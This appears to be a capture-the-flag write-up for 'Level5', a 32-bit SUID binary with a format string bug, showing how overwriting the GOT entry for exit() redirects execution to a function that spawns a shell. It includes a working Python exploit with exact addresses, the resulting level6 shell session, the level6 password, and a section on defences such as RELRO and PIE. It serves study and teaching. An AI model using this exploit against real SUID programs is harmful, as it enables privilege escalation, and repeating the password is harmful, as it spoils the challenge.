# Level5 Analysis - GOT Overwrite via Format String Exploitation

## Overview
Level5 demonstrates advanced binary exploitation using **GOT (Global Offset Table) overwrite** technique. The challenge involves redirecting program execution from an unreachable function containing a system() call through format string vulnerability exploitation.

## Binary Information
- **File**: ELF 32-bit LSB executable, Intel 80386, dynamically linked
- **Permissions**: -rwsr-s---+ 1 level6 users (SUID bit set for level6)
- **Size**: 5385 bytes
- **Functions**: printf(), fgets(), system(), exit(), _exit(), main(), n(), o()
- **Key Feature**: Function o() exists but is never called in normal execution

## Source Code Reconstruction
Through reverse engineering analysis, the equivalent C code is:

```c
#include <stdio.h>
#include <stdlib.h>

// Target function - contains system() call but never reached
void o() {
    system("/bin/sh");  // Command string at 0x80485f0
    _exit(1);
}

// Main logic with vulnerability
void n() {
    char buffer[512];
    fgets(buffer, 512, stdin);
    printf(buffer);     // VULNERABLE: Format string bug
    exit(1);            // Program always exits here - blocks reaching o()
}

int main() {
    n();
    return 0;
}
```

## Vulnerability Analysis

### Format String Vulnerability
- **Location**: `printf(buffer)` in function `n()`
- **Type**: Uncontrolled format string (CWE-134)
- **Impact**: Read/write arbitrary memory addresses using %n specifier
- **Challenge**: Program calls exit(1) immediately after printf(), preventing normal flow to o()

### Exploitation Challenge
- **Unreachable Code**: Function o() contains the desired system() call but is never called
- **Execution Flow**: `main() → n() → printf() → exit(1)` (terminates)
- **Goal**: Redirect execution to function o() at address 0x080484a4

## Key Discovery - GOT Overwrite Attack Vector

### Analysis Results
```bash
# Function addresses from GDB:
(gdb) print o
$1 = {<text variable, no debug info>} 0x80484a4 <o>

# GOT entry locations from readelf:
readelf -r level5 | grep exit
08049838  00000607 R_386_JUMP_SLOT   00000000   exit

# Stack position discovery:
echo "AAAA%1\$x.%2\$x.%3\$x.%4\$x..." | ./level5
# Result: 41414141 appears at position 4
```

### Critical Values Identified
- **Function o() address**: `0x080484a4` (134,513,828 decimal)
- **exit() GOT entry**: `0x08049838` 
- **Stack position**: 4 (where our input buffer appears)
- **Attack method**: Overwrite exit() GOT to point to o()

## Exploitation Strategy

### GOT Overwrite Technique
Instead of trying to reach function o() directly, we hijack the exit() function call:

1. **Use format string %n to write arbitrary values to arbitrary addresses**
2. **Overwrite the GOT entry for exit() to point to function o()**
3. **When exit(1) is called, execution jumps to o() instead**
4. **Function o() calls system("/bin/sh") giving us a shell**

### Payload Construction
```python
# Target: Write 0x080484a4 to address 0x08049838
target_address = 0x08049838    # exit() GOT entry  
target_value = 0x080484a4      # function o() address
stack_position = 4             # where our input appears

payload = struct.pack('<L', target_address)  # 4 bytes: where to write
remaining = target_value - 4                 # what to write (minus 4 for address bytes)
payload += "%" + str(remaining) + "c"        # width specifier for large number
payload += "%" + str(stack_position) + "$n" # write command
```

## Detailed Exploit Mechanics

### Format String Engineering
**Challenge**: Need to write large value 134,513,828 efficiently

**Solution**: Width specifier technique
- `%134513824c` prints exactly 134,513,824 characters (padded single character)
- Total characters: 4 (address bytes) + 134,513,824 (padding) = 134,513,828
- 134,513,828 in hex = 0x080484a4 (exactly the address of function o()!)

### Memory Write Process
```
Input to printf(): "\x38\x98\x04\x08%134513824c%4$n"
                      │               │           │
                      │               │           └─ Write count to position 4
                      │               └─ Print 134,513,824 chars  
                      └─ Target address (0x08049838)

Stack layout during printf():
Position 4: 0x08049838 (our target address)

%4$n writes 134,513,828 to address 0x08049838
Result: exit@got[0x08049838] = 0x080484a4
```

### Execution Flow Hijacking
```
Normal Flow:
main() → n() → fgets() → printf() → exit(1) → [program terminates]

After GOT Overwrite:
main() → n() → fgets() → printf() → exit(1) → o() → system("/bin/sh")
                                        │         │
                                        └─ redirected via GOT
                                              └─ shell access!
```

## Final Working Exploit

### exploit.py
```python
#!/usr/bin/env python2

import struct

# Addresses from analysis
o_function = 0x080484a4      # Function o() address (from GDB)
exit_got = 0x08049838        # exit() GOT address (from readelf)
STACK_POSITION = 4           # Stack position where our input appears

# Create payload for GOT overwrite
payload = struct.pack('<L', exit_got)    # Target address (4 bytes)
remaining = o_function - 4               # Characters needed for target value
payload += "%" + str(remaining) + "c"    # Width specifier
payload += "%" + str(STACK_POSITION) + "$n"  # Write to stack position 4

print payload
```

### Execution and Results
```bash
(python exploit.py; cat) | ./level5

# Results in shell access:
whoami
level6

cat /home/user/level6/.pass  
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users)
```

## Advanced Technical Concepts

### GOT (Global Offset Table) Mechanics
- **Purpose**: Dynamic linking table containing addresses of external functions
- **Location**: Writable section of memory (unlike PLT which is read-only)
- **Vulnerability**: Can be overwritten to redirect function calls
- **Impact**: When exit() is called, processor jumps to address stored in GOT entry

### Format String %n Exploitation
- **Mechanism**: %n writes the number of characters printed so far to specified address
- **Precision**: Allows exact value writes through character count manipulation
- **Efficiency**: Width specifiers enable large value writes without massive payloads
- **Positioning**: Stack position analysis enables targeted memory writes

### ELF Binary Exploitation
- **Dynamic Linking**: Understanding how external functions are resolved at runtime
- **Memory Layout**: GOT/PLT relationship and memory permissions
- **Address Calculation**: Converting between decimal character counts and hex addresses
- **Execution Flow**: How function calls traverse through PLT/GOT mechanisms

## Security Analysis

### Vulnerability Classification
- **Type**: CWE-134 (Use of Externally-Controlled Format String)
- **Impact**: Complete system compromise via arbitrary code execution
- **Vector**: Local input processing with SUID privilege escalation
- **Sophistication**: Advanced - requires deep understanding of ELF internals

### Attack Sophistication Factors
1. **Binary Analysis**: Reverse engineering to find unreachable functions
2. **Memory Layout Discovery**: Identifying GOT addresses and stack positions  
3. **Format String Mastery**: Precise exploitation of %n specifier
4. **Large Value Engineering**: Efficient character count manipulation
5. **Execution Flow Hijacking**: Understanding dynamic linking mechanisms

### Defensive Measures

#### Code-Level Protections
1. **Format String Safety**: Always use `printf("%s", buffer)` instead of `printf(buffer)`
2. **Input Validation**: Reject or sanitize inputs containing % characters
3. **Compiler Warnings**: Enable `-Wformat-security` to catch format string issues
4. **Static Analysis**: Use automated tools to detect format string vulnerabilities

#### System-Level Mitigations
1. **FORTIFY_SOURCE**: Runtime detection of format string vulnerabilities
2. **RELRO (Read-Only Relocations)**: Make GOT entries read-only after loading
3. **PIE (Position Independent Executable)**: Randomize code and data addresses
4. **ASLR**: Randomize memory layout to make GOT addresses unpredictable

#### Modern Protections
- **Full RELRO**: Complete GOT protection preventing overwrites
- **Stack Canaries**: Detect stack corruption (not applicable to this attack)
- **Control Flow Integrity**: Detect unexpected execution flow changes
- **Address Sanitizer**: Runtime detection of memory corruption

## Educational Outcomes

### Advanced Skills Demonstrated
1. **ELF Binary Analysis**: Deep understanding of dynamic linking mechanisms
2. **Memory Corruption Exploitation**: Precise control over program execution flow
3. **Format String Mastery**: Advanced techniques beyond basic vulnerabilities
4. **System Internals**: Understanding of GOT/PLT, stack layout, and memory permissions
5. **Exploit Engineering**: Efficient payload construction for complex constraints

### Key Learning Achievements
- **Binary Reverse Engineering**: Reconstructing program logic from assembly
- **Vulnerability Assessment**: Identifying complex attack vectors in secure-looking code
- **Exploitation Methodology**: Systematic approach from analysis to working exploit
- **Memory Management**: Understanding how operating systems handle dynamic linking
- **Security Architecture**: Knowledge of both attack techniques and defense mechanisms

## Level6 Access
**Password**: `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`

## Conclusion
Level5 demonstrates sophisticated binary exploitation requiring deep understanding of ELF internals, dynamic linking, and advanced format string techniques. The GOT overwrite attack showcases how attackers can hijack legitimate program functionality to achieve code execution, even when target code exists but is unreachable through normal execution paths.

This level emphasizes the importance of:
- **Secure coding practices** in format string handling
- **Modern compiler and system protections** (RELRO, PIE, FORTIFY_SOURCE)
- **Comprehensive security analysis** that considers both obvious and subtle attack vectors

The exploitation demonstrates that even seemingly minor vulnerabilities can lead to complete system compromise when combined with advanced knowledge of system internals and creative exploitation techniques.